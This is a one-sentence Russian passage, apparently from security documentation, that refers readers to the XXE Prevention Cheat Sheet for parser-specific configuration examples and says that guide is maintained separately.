    Авторитетные примеры конфигурации для конкретных парсеров приведены в руководстве XML External Entity (XXE) Prevention Cheat Sheet, которое поддерживается отдельно и обновляется по мере изменения поведения парсеров.
